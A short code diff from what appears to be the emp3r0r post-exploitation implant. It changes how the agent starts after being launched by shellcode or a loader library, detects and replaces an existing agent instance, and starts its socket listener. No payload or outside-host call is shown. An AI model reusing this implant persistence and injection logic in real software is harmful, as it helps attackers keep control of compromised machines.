@@ -220,7 +220,7 @@ func main() {
 			log.Printf("Cleaning up *.downloading: %v", err)
 		}
 
-		if run_from_guardian_shellcode {
+		if run_from_guardian_shellcode || run_from_loader {
 			log.Printf("emp3r0r %d is invoked by shellcode/loader.so in %d",
 				os.Getpid(), os.Getppid())
 		}
@@ -232,11 +232,11 @@ test_agent:
 	if alive {
 		proc, err := os.FindProcess(pid)
 		if err != nil {
-			log.Println("WTF? The agent is not running, or is it?")
+			log.Printf("Failed to find agent process with PID %d: %v", pid, err)
 		}
 
-		// exit, leave the existing agent instance running
-		if isAgentAlive() {
+		// check if agent is responsive
+		if isAgentAliveSocket() {
 			if os.Geteuid() == 0 && agent.ProcUID(pid) != "0" {
 				log.Println("Escalating privilege...")
 			} else if !replace_agent {
@@ -247,6 +247,8 @@ test_agent:
 				util.TakeASnap()
 				goto test_agent
 			}
+		} else {
+			go socketListen()
 		}
 
 		// if agent is not responsive, kill it, and start a new instance
@@ -255,12 +257,9 @@ test_agent:
 		if proc.Pid != os.Getpid() {
 			err = proc.Kill()
 			if err != nil {
-				log.Println("Failed to kill old emp3r0r", err)
+				log.Printf("Failed to kill existing emp3r0r agent: %v", err)
 			}
 		}
-	} else {
-		// start socket listener
-		go socketListen()
 	}
 
 	// if CC is behind tor, a proxy is needed
